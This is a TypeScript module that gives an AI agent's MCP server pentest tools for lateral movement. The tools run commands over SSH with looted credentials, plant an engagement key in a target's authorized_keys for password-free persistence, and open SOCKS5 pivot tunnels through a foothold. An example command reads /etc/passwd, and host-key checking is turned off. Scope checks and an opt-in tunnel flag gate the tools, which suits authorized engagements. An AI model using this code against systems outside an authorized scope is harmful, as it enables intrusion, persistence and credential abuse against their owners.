/**
 * Lateral movement tools — scope-gated SSH exec, key setup, SOCKS tunnels.
 *
 * The "move to the vuln machine" layer: `exec_ssh` runs a command on an
 * authorized host with looted creds; `tunnel_socks_start` opens a SOCKS proxy
 * through a foothold so recon/web/creds tools can route through it (`via`).
 * Every host is scope-checked per hop. Tunnels also need COBRA_ENABLE_TUNNELS=1
 * (the cobra-ops xint equivalent for a non-interactive server). Passwords ride
 * in SSHPASS env — never written to loot.
 */
import { z } from "zod";
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import fs from "node:fs";
import path from "node:path";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { assertInScope } from "../scope.js";
import { requireCapability } from "../capabilities.js";
import { runToLoot, resultText } from "../lib/exec.js";
import { startSessionChecked, stopSession } from "../lib/sessions.js";
import { registerTunnel, removeTunnel, listTunnels } from "../state.js";
import { CONFIG } from "../config.js";

const execFileP = promisify(execFile);

function text(s: string) {
  return { content: [{ type: "text" as const, text: s }] };
}

export const SSH_OPTS = [
  "-o", "UserKnownHostsFile=/dev/null",
  "-o", "StrictHostKeyChecking=accept-new",
  "-o", "ConnectTimeout=10",
  "-o", "BatchMode=yes",
];

export interface SshAuth {
  host: string;
  user: string;
  password?: string;
  key_path?: string;
  port?: number;
}

export function buildSshArgv(a: SshAuth, extra: string[], remoteCmd?: string): string[] {
  if (!a.password && !a.key_path) {
    throw new Error("auth required: pass `password` or `key_path`.");
  }
  const argv: string[] = [];
  if (a.password) argv.push(requireCapability("sshpass"), "-e");
  argv.push(requireCapability("ssh"), ...SSH_OPTS);
  if (a.key_path) argv.push("-i", a.key_path);
  if (a.port) argv.push("-p", String(a.port));
  argv.push(...extra, `${a.user}@${a.host}`);
  if (remoteCmd !== undefined) argv.push(remoteCmd);
  return argv;
}

export function registerLateralTools(server: McpServer): void {
  server.tool(
    "exec_ssh",
    "Run a command on an authorized host over SSH (password or key). Lateral movement primitive: act on the next machine with creds from creds_brute/loot. Output to loot file.",
    {
      host: z.string().describe("Target host (must be in COBRA_ALLOWED_SCOPE)"),
      user: z.string().describe("Username"),
      password: z.string().optional().describe("Password (SSHPASS env, never logged)"),
      key_path: z.string().optional().describe("Private key path (e.g. from ssh_key_setup)"),
      port: z.number().optional().describe("SSH port (default 22)"),
      command: z.string().describe("Remote command, e.g. 'id; uname -a; cat /etc/passwd'"),
    },
    async ({ host, user, password, key_path, port, command }) => {
      assertInScope(host);
      const argv = buildSshArgv({ host, user, password, key_path, port }, ["-T"], command);
      const env = password ? { SSHPASS: password } : undefined;
      const r = await runToLoot("exec_ssh", argv, { env, timeoutMs: 10 * 60 * 1000, maxLines: 30 });
      return text(resultText(`exec_ssh ${user}@${host}`, r));
    }
  );

  server.tool(
    "ssh_key_setup",
    "Generate an engagement keypair (in the loot dir) and install the pubkey on the target with a looted password. Then use exec_ssh/tunnel_socks_start with key_path — password-free.",
    {
      host: z.string().describe("Target host (in scope)"),
      user: z.string().describe("Username"),
      password: z.string().describe("Looted password for the initial install"),
      port: z.number().optional().describe("SSH port (default 22)"),
    },
    async ({ host, user, password, port }) => {
      assertInScope(host);
      const sshpass = requireCapability("sshpass");
      const ssh = requireCapability("ssh");
      const sshKeygen = requireCapability("ssh-keygen");
      fs.mkdirSync(path.join(CONFIG.lootDir, "keys"), { recursive: true });
      const keyPath = path.join(CONFIG.lootDir, "keys", `cobra-${user}-${host.replace(/[^a-zA-Z0-9.-]/g, "_")}`);
      if (!fs.existsSync(keyPath)) {
        await execFileP(sshKeygen, ["-q", "-t", "ed25519", "-N", "", "-f", keyPath, "-C", `cobra-${user}@${host}`]);
      }
      const pub = fs.readFileSync(`${keyPath}.pub`, "utf8").trim();
      const installCmd =
        "mkdir -p ~/.ssh && chmod 700 ~/.ssh && " +
        `grep -qF '${pub}' ~/.ssh/authorized_keys 2>/dev/null || echo '${pub}' >> ~/.ssh/authorized_keys; ` +
        "chmod 600 ~/.ssh/authorized_keys; echo KEY_INSTALLED";
      const argv = [sshpass, "-e", ssh, ...SSH_OPTS, ...(port ? ["-p", String(port)] : []),
        "-T", `${user}@${host}`, installCmd];
      const r = await runToLoot("ssh_key_setup", argv, { env: { SSHPASS: password }, timeoutMs: 60 * 1000 });
      const ok = r.exitCode === 0 && fs.readFileSync(r.lootFile, "utf8").includes("KEY_INSTALLED");
      return text(
        `${resultText("ssh_key_setup", r)}\n\n` +
          (ok
            ? `🔑 Key installed. Use key_path: ${keyPath}`
            : `⚠️ Key install may have failed (exit ${r.exitCode}) — check the loot file.`)
      );
    }
  );

  server.tool(
    "tunnel_socks_start",
    "Open a SOCKS5 proxy through a foothold (ssh -D). Session-managed; returns a tunnel id usable as `via` on recon/web/creds tools. Requires COBRA_ENABLE_TUNNELS=1.",
    {
      host: z.string().describe("Foothold host (in scope)"),
      user: z.string().describe("Username"),
      password: z.string().optional().describe("Password (SSHPASS env, never logged)"),
      key_path: z.string().optional().describe("Private key path (e.g. from ssh_key_setup)"),
      port: z.number().optional().describe("SSH port (default 22)"),
      local_port: z.number().optional().describe("Local SOCKS port (default 1080)"),
    },
    async ({ host, user, password, key_path, port, local_port }) => {
      if (!CONFIG.enableTunnels) {
        return text(
          "❌ Tunnels disabled. Set COBRA_ENABLE_TUNNELS=1 on the server (the cobra-ops xint equivalent) and restart."
        );
      }
      assertInScope(host);
      const lport = local_port ?? 1080;
      // Port-safety: a lingering generic session (nc listener etc.) on the same
      // port makes ssh -D fail — ExitOnForwardFailure + the liveness check
      // below catch it and report instead of registering a dead tunnel.
      const argv = buildSshArgv(
        { host, user, password, key_path, port },
        ["-N", "-T", "-D", `127.0.0.1:${lport}`, "-o", "ExitOnForwardFailure=yes", "-o", "ServerAliveInterval=30"]
      );
      const env = password ? { SSHPASS: password } : undefined;
      const info = await startSessionChecked(
        "tunnel",
        `ssh -D 127.0.0.1:${lport} ${user}@${host} (SOCKS5)`,
        argv,
        2500,
        { env }
      );
      registerTunnel({ id: info.id, port: lport, socksVersion: 5, via: `${user}@${host}` });
      return text(
        `🕳️  SOCKS5 tunnel up — tunnel id ${info.id}\n` +
          `  socks5://127.0.0.1:${lport} → via ${user}@${host}\n` +
          `  Use via="${info.id}" on recon/web/creds tools to route through it.\n` +
          `  log: ${info.outputFile}`
      );
    }
  );

  server.tool(
    "tunnel_list",
    "List active SOCKS tunnels (id, local port, foothold).",
    {},
    async () => {
      const ts = listTunnels();
      if (ts.length === 0) return text("No active tunnels. Start one with tunnel_socks_start.");
      const rows = ts.map((t) => `- ${t.id}  socks${t.socksVersion}://127.0.0.1:${t.port}  via ${t.via}`);
      return text(`## Active tunnels (${ts.length})\n\n` + rows.join("\n"));
    }
  );

  server.tool(
    "tunnel_stop",
    "Stop a SOCKS tunnel by id (kills the ssh process and removes the route).",
    { id: z.string().describe("Tunnel id from tunnel_socks_start / tunnel_list") },
    async ({ id }) => {
      removeTunnel(id);
      return text(stopSession(id) ? `🛑 Tunnel ${id} stopped.` : `No such tunnel: ${id}`);
    }
  );
}

